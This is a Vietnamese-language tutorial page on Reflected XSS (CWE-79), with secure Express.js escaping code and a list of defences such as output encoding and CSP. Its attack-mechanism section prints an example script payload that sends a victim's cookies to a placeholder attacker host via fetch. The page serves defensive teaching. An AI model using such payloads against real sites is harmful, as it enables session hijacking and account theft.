# Reflected XSS

> **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation) | **Phân loại**: Cross-Site Scripting

## Kiến thức Nền tảng

Hãy tưởng tượng tham số truy vấn trên URL giống như một lời nhắn gửi kèm theo phong bì thư bạn gửi lên máy chủ (ví dụ: `?q=tin_tức`). Khi nhận được phong bì, máy chủ sẽ đọc lời nhắn này và dùng nó để tạo ra một trang phản hồi động (như trang kết quả tìm kiếm cho từ khóa "tin_tức") rồi gửi lại cho bạn. Tuy nhiên, nếu máy chủ này quá ngây thơ – nhận được lời nhắn thế nào liền in nguyên văn như thế lên trang phản hồi mà không thèm kiểm tra xem lời nhắn đó có chứa các ký tự nguy hiểm của ngôn ngữ HTML hay không – thì đó chính là nguồn cơn của lỗ hổng bảo mật.

### Code ví dụ hoạt động bình thường (Secure Server-Side Rendering)
```javascript
const express = require('express');
const app = express();

// Helper function to escape HTML characters and prevent XSS injection
const escapeHtml = (unsafeString) => {
    if (typeof unsafeString !== 'string') {
        return '';
    }
    return unsafeString
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
};

// Express route handling search query parameters
app.get('/search', (req, res) => {
    // Retrieve parameter and ensure it is treated strictly as a string
    const rawQuery = typeof req.query.q === 'string' ? req.query.q : '';
    
    // Escape user input before interpolating it into server-side HTML rendering
    const safeQuery = escapeHtml(rawQuery);
    
    // Send response with safely encoded parameters
    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: <strong>${safeQuery}</strong></p>
            </body>
        </html>
    `);
});
```

## Mô tả lỗ hổng

Lỗ hổng Reflected XSS (XSS phản xạ) xảy ra khi máy chủ lấy dữ liệu từ yêu cầu gửi lên và "phản chiếu" ngay lập tức nó vào trang web trả về cho trình duyệt mà không qua bộ lọc an toàn. Kẻ tấn công sẽ tạo ra một đường dẫn URL chứa mã JavaScript độc hại ở phần tham số truy vấn rồi tìm cách lừa nạn nhân click vào đó. Khi nạn nhân bấm link, trình duyệt gửi yêu cầu lên máy chủ, máy chủ lập tức phản chiếu đoạn mã độc đó vào trang HTML trả về. Trình duyệt của nạn nhân nhận được trang web, tưởng đó là nội dung hợp lệ của hệ thống nên chạy mã độc ngay lập tức. Sự nguy hiểm của cuộc tấn công này nằm ở chỗ nó diễn ra tức thì và có thể dễ dàng giúp kẻ tấn công cướp quyền đăng nhập của người dùng chỉ qua một cú click chuột đơn giản.

## Cơ chế tấn công

Kẻ tấn công quan sát thấy một trang web hiển thị lại tham số tìm kiếm từ URL lên trang kết quả (ví dụ truy cập `http://site.com/search?q=banana` sẽ in ra dòng "Search results for: banana"). Chúng tạo một liên kết độc hại có dạng `http://site.com/search?q=<script>fetch('http://evil.com?c=' + document.cookie)</script>` và gửi cho nạn nhân qua email. Khi nạn nhân click, máy chủ của trang web nhận yêu cầu, chèn trực tiếp kịch bản script vào trang HTML trả về, khiến trình duyệt của nạn nhân chạy đoạn mã gửi cookie phiên làm việc của họ sang máy chủ của kẻ tấn công.

## Biện pháp phòng thủ

- **Tóm tắt**: Phòng chống Reflected XSS bằng cách mã hóa dữ liệu đầu ra dựa theo ngữ cảnh hiển thị, kiểm tra kiểu dữ liệu đầu vào nghiêm ngặt và triển khai chính sách Content Security Policy (CSP).
- **Các bước chi tiết**:
  - Thực hiện mã hóa đầu ra tương thích với ngữ cảnh (HTML body, thuộc tính HTML, kịch bản JavaScript, hoặc tham số URL) cho tất cả các dữ liệu do người dùng cung cấp trước khi trả về.
  - Xác thực và lọc sạch tất cả các tham số đầu vào bằng cơ chế danh sách trắng (allowlist).
  - Triển khai chính sách bảo mật nội dung (CSP) nghiêm ngặt để cấm thực thi các tập lệnh inline không rõ nguồn gốc và giới hạn nguồn script được phép tải.
  - Sử dụng các framework hiện đại (React, Angular, Vue) có tích hợp sẵn cơ chế mã hóa đầu ra an toàn theo mặc định.
  - Thiết lập tiêu đề phản hồi `X-Content-Type-Options: nosniff` để ngăn chặn các cuộc tấn công khai thác MIME-sniffing.

## Code Example

```javascript
const escapeHtml = (unsafeString) => {
    if (typeof unsafeString !== 'string') {
        return '';
    }
    return unsafeString
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
};

// Example handler rendering search results
app.get('/search', (req, res) => {
    const query = typeof req.query.q === 'string' ? req.query.q : '';
    const safeQuery = escapeHtml(query);
    res.send(`<h1>Search results for: ${safeQuery}</h1>`);
});
```

## Xem thêm

- [Stored XSS](../stored/) — Lỗ hổng XSS lưu trữ.

## Nguồn tham khảo

- OWASP XSS Cheat Sheet, PortSwigger, CWE-79

## Giải thích thuật ngữ

- **Reflected XSS**: Lỗ hổng XSS phản xạ, mã độc được gửi qua request và trả về ngay lập tức trong response của server.
- **Query Parameter**: Tham số đi kèm trên đường dẫn URL để truyền tải dữ liệu.
- **Server-Side Rendering**: Phương pháp dựng toàn bộ giao diện HTML động ngay trên máy chủ trước khi gửi về client.
- **Payload**: Đoạn mã khai thác được kẻ tấn công chèn vào hệ thống.
- **HTML Entity**: Ký tự mã hóa đặc biệt đại diện cho các thẻ HTML giúp trình duyệt không hiểu nhầm thành lệnh thực thi.
